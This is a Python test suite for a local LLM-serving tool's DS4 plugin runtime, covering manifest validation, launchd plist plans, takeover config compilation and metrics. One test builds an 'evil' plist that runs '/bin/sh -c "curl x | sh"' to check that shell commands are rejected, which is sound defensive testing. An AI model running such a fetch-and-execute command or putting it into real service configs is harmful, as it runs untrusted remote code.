#!/usr/bin/env python3
from __future__ import annotations

import json
import os
import plistlib
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))
import model_dispatch
import plugin_registry
import plugin_runtime


def test_ds4_fixture_compiles():
    manifest = plugin_registry.load_manifest(ROOT / "plugins/ds4/manifest.yaml", trusted=True)
    fixture = json.loads((ROOT / "tests/fixtures/ds4.runtime.json").read_text())
    preview = {"fields": plugin_registry._filter_fields(fixture)}
    models = plugin_runtime.compile_ds4_models(preview["fields"])
    assert set(models) == {"glm-5.3-flash", "ds4high"}
    assert models["glm-5.3-flash"]["capabilities"]["vision"] is True
    assert models["ds4high"]["context_window"] == 307200
    assert "fixture-secret-value" not in json.dumps(preview)
    assert manifest.exclusive_group == "large-local"


def test_unknown_manifest_fields_rejected():
    tmp = Path(tempfile.mkdtemp())
    path = tmp / "manifest.yaml"
    path.write_text("schema_version: 1\nid: x\ndisplay_name: X\nunknown: true\ndiscover: {executables: [x]}\nservice: {mode: observe}\n")
    try:
        plugin_registry.load_manifest(path)
    except plugin_registry.ManifestError as exc:
        assert "unknown field" in str(exc)
    else:
        raise AssertionError("unknown field accepted")


def _ds4_fixture_plan():
    manifest = plugin_registry.load_manifest(ROOT / "plugins/ds4/manifest.yaml", trusted=True)
    fixture = json.loads((ROOT / "tests/fixtures/ds4.runtime.json").read_text())
    fields = plugin_registry._filter_fields(fixture)
    item = {"id": "ds4", "import_preview": [{"fields": fields}]}
    return plugin_runtime.plan_actions(manifest, item), fields


def test_ds4_plan_covers_variants_aliases_and_timeouts():
    plan, _ = _ds4_fixture_plan()
    assert plan["router"]["idle_timeout_seconds"] == 600
    assert plan["router"]["backend_start_timeout_seconds"] == 120
    activated = {action["model"] for action in plan["activation"]}
    assert activated == {"glm-5.3-flash", "ds4high"}
    for action in plan["activation"]:
        assert action["http"]["path"] == "/_router/switch"
        assert action["http"]["payload"] == {"model": action["model"]}
    assert plan["variants"]["ds4high"]["context"] == 307200
    argv = plan["variants"]["ds4high"]["argv_fragment"]
    assert "--vision" in argv and "--mtp-model" in argv and "--dspark" in argv
    assert "--ssd-streaming" in plan["variants"]["ds4pro"]["argv_fragment"]
    assert plan["variants"]["ds4pro"]["advertise"] is False
    assert plan["rollback"]["restore_order"][0] == "stop_service"


def test_ds4_plan_writes_only_preview_plists():
    plan, fields = _ds4_fixture_plan()
    with tempfile.TemporaryDirectory() as tmp:
        out = Path(tmp) / "plan"
        written = plugin_runtime.write_plan(plan, out, fields)
        assert (out / "plan.json").is_file()
        plists = [p for p in written if p.endswith(".plist")]
        assert plists and all(p.startswith(str(out)) for p in plists)
        by_variant = {}
        for path in plists:
            data = plistlib.loads(Path(path).read_bytes())
            args = data["ProgramArguments"]
            by_variant[Path(path).stem] = (data, args)
            assert ";" not in " ".join(args) and "|" not in " ".join(args)
        high = next(v for k, v in by_variant.items() if "ds4high" in k)
        assert "--ctx" in high[1] and "307200" in high[1]
        assert "--tokens" in high[1] and "32768" in high[1]
        assert "--vision" in high[1] and "--mtp-model" in high[1] and "--dspark" in high[1]
        pro = next(v for k, v in by_variant.items() if "ds4pro" in k)
        assert "--ssd-streaming" in pro[1]
        assert high[0]["Label"] == "com.fixture.ds4-server"


def test_plan_refuses_nonempty_output_dir():
    plan, fields = _ds4_fixture_plan()
    with tempfile.TemporaryDirectory() as tmp:
        out = Path(tmp)
        (out / "keep.txt").write_text("x")
        try:
            plugin_runtime.write_plan(plan, out, fields)
        except ValueError:
            pass
        else:
            raise AssertionError("non-empty plan dir accepted")


def _takeover_fixture():
    return plugin_runtime.compile_ds4_takeover(ROOT / "tests/fixtures/ds4.takeover.json")


def test_ds4_takeover_compiles_managed_adapters():
    compiled = _takeover_fixture()
    adapter = compiled["adapters"].get("ds4-ds4-ds4high")
    assert adapter, compiled["adapters"].keys()
    command = adapter["command"]
    assert command[0] == "/usr/local/bin/ds4-server"
    root = str(ROOT / "tests/fixtures/models")
    assert command[command.index("--model") + 1] == f"{root}/fixture-high.gguf"
    assert command[command.index("--ctx") + 1] == "307200"
    assert command[command.index("--tokens") + 1] == "32768"
    assert command[command.index("--vision") + 1] == f"{root}/fixture-vision.gguf"
    assert command[command.index("--mtp-model") + 1] == f"{root}/fixture-aux.gguf"
    assert "--dspark" in command
    assert command[command.index("--kv-disk-dir") + 1] == "/fixture/kv"
    joined = " ".join(command)
    assert ";" not in joined and "|" not in joined
    assert adapter["env"]["DS4_ENV_KEEP"] == "1"
    assert adapter["type"] == "managed" and adapter["exclusive_group"] == "large-local"
    model = compiled["models"]["ds4high"]
    assert model["adapter"] == "ds4-ds4-ds4high"
    assert model["capabilities"]["vision"] is True
    assert model["context_window"] == 307200
    assert model["reasoning_levels"] == ["off", "high", "max"]
    assert model["runtime_summary"] == ["DSpark"]
    assert compiled["rollback"]["restore_order"][0] == "stop_service"


def test_ds4_takeover_rejects_unknown_variant_alias():
    with tempfile.TemporaryDirectory() as tmp:
        config = Path(tmp) / "cfg" / "runtime.json"
        config.parent.mkdir()
        config.write_text(json.dumps({
            "variants": {"v1": {"path": "m.gguf", "context": 1024, "output": 128}},
            "services": {},
            "aliases": {"bad": ["ds4", "nope"]},
        }))
        try:
            plugin_runtime.compile_ds4_takeover(config)
        except ValueError as exc:
            assert "unknown" in str(exc)
        else:
            raise AssertionError("unknown variant alias accepted")


def test_ds4_takeover_rejects_shell_plist():
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        plist_path = root / "evil.plist"
        plist_path.write_bytes(plistlib.dumps({
            "Label": "evil",
            "ProgramArguments": ["/bin/sh", "-c", "curl x | sh"],
        }))
        config = root / "cfg" / "runtime.json"
        config.parent.mkdir()
        config.write_text(json.dumps({
            "variants": {"v1": {"path": "m.gguf", "context": 1024, "output": 128}},
            "services": {"ds4": {"plist": str(plist_path), "port": 18888, "model": "deepseek-v4-flash", "context": 1024, "output": 128}},
            "aliases": {},
        }))
        try:
            plugin_runtime.compile_ds4_takeover(config)
        except ValueError as exc:
            assert "shell syntax" in str(exc)
        else:
            raise AssertionError("shell plist accepted")


def test_ds4_takeover_rejects_missing_model_asset():
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        plist_path = root / "svc.plist"
        plist_path.write_bytes(plistlib.dumps({
            "Label": "svc",
            "ProgramArguments": ["/usr/local/bin/ds4-server", "--model", str(root / "old.gguf"), "--port", "18888"],
        }))
        config = root / "cfg" / "runtime.json"
        config.parent.mkdir()
        config.write_text(json.dumps({
            "variants": {"v1": {"path": "missing/model.gguf", "context": 1024, "output": 128}},
            "services": {"ds4": {"plist": str(plist_path), "port": 18888, "model": "m", "context": 1024, "output": 128}},
            "aliases": {},
        }))
        try:
            plugin_runtime.compile_ds4_takeover(config)
        except ValueError as exc:
            assert "model asset missing" in str(exc)
        else:
            raise AssertionError("missing model asset accepted")


def test_takeover_merges_base_config_and_drops_router():
    compiled = plugin_runtime.compile_ds4_takeover(ROOT / "tests/fixtures/ds4.takeover.json")
    with tempfile.TemporaryDirectory() as tmp:
        base_path = Path(tmp) / "base.yaml"
        base_path.write_text("\n".join([
            "listen_port: 18800",
            "load_timeout_seconds: 300",
            "adapters:",
            "  ds4-router:",
            "    type: external",
            "    endpoint: http://127.0.0.1:8888",
            "    health_path: /_router/status",
            "  omlx-observe:",
            "    type: observe",
            "    endpoint: http://127.0.0.1:8000",
            "    health_path: /health",
            "resource_groups:",
            "  large-local:",
            "    capacity: 1",
            "models:",
            "  old-ds4:",
            "    adapter: ds4-router",
            "    backend_model: old-ds4",
            "    resource_group: large-local",
            "    lifecycle_owner: ds4-router",
            "    capabilities: {chat: true, stream: true, vision: false}",
            "  omlx-rag:",
            "    adapter: omlx-observe",
            "    backend_model: omlx-rag",
            "    lifecycle_owner: omlx",
            "    capabilities: {chat: true, stream: true, vision: false}",
        ]), encoding="utf-8")
        merged = plugin_runtime.merge_base_config(compiled, base_path, {"ds4-router"})
        assert "ds4-router" not in merged["adapters"]
        assert "old-ds4" not in merged["models"]
        assert merged["adapters"]["omlx-observe"]["type"] == "observe"
        assert merged["models"]["omlx-rag"]["adapter"] == "omlx-observe"
        assert "ds4-ds4-ds4high" in merged["adapters"]
        assert merged["_base_listen"]["load_timeout_seconds"] == 300
        assert plugin_runtime.validate_runtime(merged) == []


def _write_takeover_tree(tmp: Path, variants: dict, aliases: dict | None = None, argv: list[str] | None = None) -> Path:
    """Write a minimal DS4 runtime config + plist under tmp and return the config path."""
    root = Path(tmp)
    for name in ("model.gguf", "vision.gguf", "aux.gguf"):
        (root / name).write_bytes(b"")
    plist_path = root / "svc.plist"
    plist_path.write_bytes(plistlib.dumps({
        "Label": "svc",
        "ProgramArguments": argv or ["/usr/bin/true", "--model", str(root / "model.gguf"), "--port", "18891", "--ctx", "4096", "--tokens", "256"],
        "WorkingDirectory": str(root),
    }))
    config = root / "cfg" / "runtime.json"
    config.parent.mkdir(exist_ok=True)
    config.write_text(json.dumps({
        "variants": variants,
        "services": {"ds4": {"plist": str(plist_path), "port": 18891, "model": "m", "context": 4096, "output": 256}},
        "aliases": aliases if aliases is not None else {},
    }))
    return config


def _expect_value_error(fn, needle: str):
    try:
        fn()
    except ValueError as exc:
        assert needle in str(exc), f"{needle!r} not in {exc}"
    else:
        raise AssertionError(f"expected ValueError containing {needle!r}")


def test_dspark_requires_auxiliary_model():
    # ds4 aborts at startup with "--dspark requires --mtp-model FILE"; fail at import time instead.
    base_variant = {"path": "model.gguf", "context": 4096, "output": 256}
    for runtime in ({"dspark": True}, {"dspark_strict": True}, {"dspark_confidence": 0.8}):
        with tempfile.TemporaryDirectory() as tmp:
            config = _write_takeover_tree(Path(tmp), {"v1": {**base_variant, "runtime": runtime}})
            _expect_value_error(lambda: plugin_runtime.compile_ds4_takeover(config), "auxiliary_model")
    with tempfile.TemporaryDirectory() as tmp:
        ok = {"path": "model.gguf", "context": 4096, "output": 256,
              "runtime": {"dspark": True, "auxiliary_model": "aux.gguf", "dspark_confidence": 0.8, "dspark_strict": True}}
        compiled = plugin_runtime.compile_ds4_takeover(_write_takeover_tree(Path(tmp), {"v1": ok}))
        command = compiled["adapters"]["ds4-ds4-v1"]["command"]
        assert "--dspark" in command and "--dspark-strict" in command
        assert command[command.index("--dspark-confidence") + 1] == "0.8"
        assert command[command.index("--mtp-model") + 1].endswith("aux.gguf")


def test_runtime_option_types_validated():
    base_variant = {"path": "model.gguf", "context": 4096, "output": 256}
    bad_runtimes = [
        ({"dspark": "yes"}, "boolean"),
        ({"ssd_streaming": 1}, "boolean"),
        ({"dspark_confidence": 1.5}, "between 0 and 1"),
        ({"dspark_confidence": -0.1}, "between 0 and 1"),
        ({"dspark_confidence": True}, "between 0 and 1"),
        ({"mtp_draft": 0}, "positive integer"),
        ({"mtp_draft": 2.5}, "positive integer"),
        ({"ssd_streaming_cache_experts": 40}, "non-empty string"),
        ({"vision_model": ""}, "non-empty path"),
    ]
    for runtime, needle in bad_runtimes:
        with tempfile.TemporaryDirectory() as tmp:
            config = _write_takeover_tree(Path(tmp), {"v1": {**base_variant, "runtime": runtime}})
            _expect_value_error(lambda: plugin_runtime.compile_ds4_takeover(config), needle)


def test_takeover_validates_context_and_output():
    bad_variants = [
        ({"path": "model.gguf", "output": 256}, "context must be a positive integer"),
        ({"path": "model.gguf", "context": True, "output": 256}, "context must be a positive integer"),
        ({"path": "model.gguf", "context": 4096}, "output must be a positive integer"),
        ({"path": "model.gguf", "context": 4096, "output": 8192}, "output exceeds context"),
    ]
    for variant, needle in bad_variants:
        with tempfile.TemporaryDirectory() as tmp:
            config = _write_takeover_tree(Path(tmp), {"v1": variant})
            _expect_value_error(lambda: plugin_runtime.compile_ds4_takeover(config), needle)


def test_takeover_preserves_flags_around_boolean_mtp():
    # ds4-server --mtp is boolean; stripping it must not eat the following flag.
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        argv = ["/usr/bin/true", "--model", str(root / "model.gguf"), "--port", "18891", "--ctx", "4096",
                "--tokens", "256", "--mtp", "--kv-disk-dir", "/fixture/kv"]
        config = _write_takeover_tree(root, {"v1": {"path": "model.gguf", "context": 4096, "output": 256}}, argv=argv)
        compiled = plugin_runtime.compile_ds4_takeover(config)
        command = compiled["adapters"]["ds4-ds4-v1"]["command"]
        assert "--mtp" not in command
        assert command[command.index("--kv-disk-dir") + 1] == "/fixture/kv"


def test_takeover_hidden_variant_served_not_listed():
    with tempfile.TemporaryDirectory() as tmp:
        variants = {
            "pub": {"path": "model.gguf", "context": 307200, "output": 32768},
            "hid": {"path": "model.gguf", "context": 524288, "output": 32768, "advertise": False},
        }
        aliases = {"pub-alias": ["ds4", "pub"], "hid-alias": ["ds4", "hid"]}
        compiled = plugin_runtime.compile_ds4_takeover(_write_takeover_tree(Path(tmp), variants, aliases))
        # Hidden variants still get an adapter so their aliases keep resolving.
        assert "ds4-ds4-hid" in compiled["adapters"]
        assert compiled["models"]["pub-alias"]["advertise"] is True
        assert compiled["models"]["hid-alias"]["advertise"] is False
        assert compiled["models"]["hid-alias"]["context_window"] == 524288
        assert plugin_runtime.validate_runtime(compiled) == []


def test_takeover_hidden_variant_missing_assets_skipped_not_fatal():
    with tempfile.TemporaryDirectory() as tmp:
        variants = {
            "pub": {"path": "model.gguf", "context": 307200, "output": 32768},
            "gone": {"path": "deleted.gguf", "context": 131072, "output": 8192, "advertise": False},
        }
        aliases = {"pub-alias": ["ds4", "pub"], "gone-alias": ["ds4", "gone"]}
        compiled = plugin_runtime.compile_ds4_takeover(_write_takeover_tree(Path(tmp), variants, aliases))
        assert "ds4-ds4-gone" not in compiled["adapters"]
        assert "gone-alias" not in compiled["models"]
        assert "pub-alias" in compiled["models"]
        assert any("gone" in warning and "missing" in warning for warning in compiled["warnings"])
        assert any("gone-alias" in warning for warning in compiled["warnings"])
        assert plugin_runtime.validate_runtime(compiled) == []


def _load_dispatcher(config_payload: dict, tmp: Path) -> model_dispatch.ModelDispatcher:
    config_path = Path(tmp) / "engines.json"
    config_path.write_text(json.dumps(config_payload), encoding="utf-8")
    os.environ["INFERENCEDOCK_SETTINGS_PATH"] = str(Path(tmp) / "settings.json")
    config = model_dispatch.load_config(config_path)
    return model_dispatch.ModelDispatcher(config, Path(tmp))


def test_takeover_yaml_models_listing_parity():
    """The written takeover YAML must round-trip: same ids, exact contexts, hidden models unlisted."""
    with tempfile.TemporaryDirectory() as tmp:
        out = Path(tmp) / "out"
        rc = plugin_runtime.main(["takeover", "--ds4-config", str(ROOT / "tests/fixtures/ds4.takeover.json"), "--out", str(out)])
        assert rc == 0
        compiled = plugin_runtime.compile_ds4_takeover(ROOT / "tests/fixtures/ds4.takeover.json")
        import yaml
        written = yaml.safe_load((out / "ds4-takeover.yaml").read_text(encoding="utf-8"))
        config = model_dispatch.load_config(out / "ds4-takeover.yaml")
        assert set(config.models) == set(compiled["models"])
        for name, model in config.models.items():
            source = compiled["models"][name]
            assert model.context_window == source["context_window"]
            assert model.max_output_tokens == source["max_output_tokens"]
            assert model.backend_model == source["backend_model"]
            assert model.capabilities["vision"] == source["capabilities"]["vision"]
            assert model.adapter in config.adapters
            if model.max_output_tokens and model.context_window:
                assert model.max_output_tokens <= model.context_window
        dispatcher = _load_dispatcher(written, Path(tmp))
        try:
            listed = {entry["id"] for entry in dispatcher.model_entries()}
            advertised = {name for name, model in compiled["models"].items() if model.get("advertise", True)}
            assert listed == advertised
            everything = {entry["id"] for entry in dispatcher.model_entries(include_hidden=True)}
            assert everything == set(compiled["models"])
        finally:
            dispatcher.shutdown()
            os.environ.pop("INFERENCEDOCK_SETTINGS_PATH", None)


def test_disabled_model_rejected_but_hidden_servable():
    with tempfile.TemporaryDirectory() as tmp:
        payload = {
            "listen_port": 18892,
            "adapters": {"ext": {"type": "external", "endpoint": "http://127.0.0.1:18993", "health_path": "/health"}},
            "models": {
                "off-model": {"adapter": "ext", "enabled": False, "capabilities": {"chat": True, "stream": True, "vision": False}},
                "hid-model": {"adapter": "ext", "advertise": False, "capabilities": {"chat": True, "stream": True, "vision": False}},
            },
        }
        dispatcher = _load_dispatcher(payload, Path(tmp))
        try:
            listed = {entry["id"] for entry in dispatcher.model_entries()}
            assert listed == set(), listed
            for action in (lambda: dispatcher.activate("off-model"), lambda: dispatcher.begin_request("off-model", False)):
                try:
                    action()
                except model_dispatch.DispatchError as exc:
                    assert exc.error_type == "model_disabled" and exc.status == 409
                else:
                    raise AssertionError("disabled model accepted")
        finally:
            dispatcher.shutdown()
            os.environ.pop("INFERENCEDOCK_SETTINGS_PATH", None)


def test_metrics_snapshot_aggregates_series():
    with tempfile.TemporaryDirectory() as tmp:
        recorder = model_dispatch.RequestRecorder(Path(tmp) / "metrics.jsonl")
        recorder.record({"ts": 1000.0, "model": "m1", "tokens_per_second": 10.0, "ttft_ms": 100.0, "cached_tokens": 5, "finish_reason": "stop"})
        recorder.record({"ts": 1001.0, "model": "m1", "tokens_per_second": 20.0, "ttft_ms": 300.0, "finish_reason": "stop"})
        recorder.record({"ts": 1002.0, "model": "m1", "tokens_per_second": 30.0, "finish_reason": "request_cancelled"})
        recorder.record({"ts": 1003.0, "model": "m2", "prefill_tokens_per_second": 500.0, "finish_reason": "client_disconnect"})
        snapshot = recorder.snapshot(limit=10)
        assert [r["ts"] for r in snapshot["requests"]] == [1003.0, 1002.0, 1001.0, 1000.0], "newest first"
        summaries = {s["model"]: s for s in snapshot["summaries"]}
        m1 = summaries["m1"]
        assert m1["total_requests"] == 3
        assert m1["successful_requests"] == 2 and m1["excluded_requests"] == 1
        assert m1["decode"] == {"count": 2, "min": 10.0, "max": 20.0, "mean": 15.0, "median": 15.0}
        assert m1["ttft_ms"]["max"] == 300.0
        assert m1["cache"] == {"count": 1, "min": 5.0, "max": 5.0, "mean": 5.0, "median": 5.0}
        assert m1["prefill"] is None
        assert m1["window_start"] == time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(1000.0))
        m2 = summaries["m2"]
        assert m2["successful_requests"] == 0 and m2["excluded_requests"] == 1
        assert m2["decode"] is None
        limited = recorder.snapshot(limit=1)
        assert len(limited["requests"]) == 1 and limited["summaries"][0]["model"] == "m2"


def test_model_entries_expose_instance_and_canonical_fields():
    with tempfile.TemporaryDirectory() as tmp:
        payload = {
            "listen_port": 18894,
            "adapters": {
                "ext": {"type": "external", "endpoint": "http://127.0.0.1:18995", "health_path": "/health"},
                "fake-a": {"type": "fake", "port": 18996},
            },
            "models": {
                "m1": {"adapter": "ext", "aliases": ["a1"], "capabilities": {"chat": True, "stream": True, "vision": False}},
                "m1-alt": {"adapter": "ext", "canonical": "m1", "capabilities": {"chat": True, "stream": True, "vision": False}},
                "m2": {"adapter": "fake-a", "capabilities": {"chat": True, "stream": True, "vision": False}},
            },
        }
        dispatcher = _load_dispatcher(payload, Path(tmp))
        try:
            entries = {entry["id"]: entry for entry in dispatcher.model_entries()}
            assert entries["m1"]["canonical"] == "m1" and entries["m1"]["aliases"] == ["a1"]
            assert entries["m1-alt"]["canonical"] == "m1" and entries["m1-alt"]["aliases"] == []
            assert entries["m1"]["loaded"] is False and entries["m1"]["active_requests"] == 0
            assert entries["m1"]["server_status"] == "unknown", "external adapter state is not knowable without a probe"
            assert entries["m2"]["server_status"] == "stopped", "owned backend not started by this core is stopped"
        finally:
            dispatcher.shutdown()
            os.environ.pop("INFERENCEDOCK_SETTINGS_PATH", None)


TESTS = [
    test_ds4_fixture_compiles,
    test_unknown_manifest_fields_rejected,
    test_ds4_plan_covers_variants_aliases_and_timeouts,
    test_ds4_plan_writes_only_preview_plists,
    test_plan_refuses_nonempty_output_dir,
    test_ds4_takeover_compiles_managed_adapters,
    test_ds4_takeover_rejects_unknown_variant_alias,
    test_ds4_takeover_rejects_shell_plist,
    test_ds4_takeover_rejects_missing_model_asset,
    test_takeover_merges_base_config_and_drops_router,
    test_dspark_requires_auxiliary_model,
    test_runtime_option_types_validated,
    test_takeover_validates_context_and_output,
    test_takeover_preserves_flags_around_boolean_mtp,
    test_takeover_hidden_variant_served_not_listed,
    test_takeover_hidden_variant_missing_assets_skipped_not_fatal,
    test_takeover_yaml_models_listing_parity,
    test_disabled_model_rejected_but_hidden_servable,
    test_metrics_snapshot_aggregates_series,
    test_model_entries_expose_instance_and_canonical_fields,
]


def main():
    for test in TESTS:
        print(f"run {test.__name__}", flush=True)
        test()
        print(f"ok {test.__name__}", flush=True)


if __name__ == "__main__":
    main()
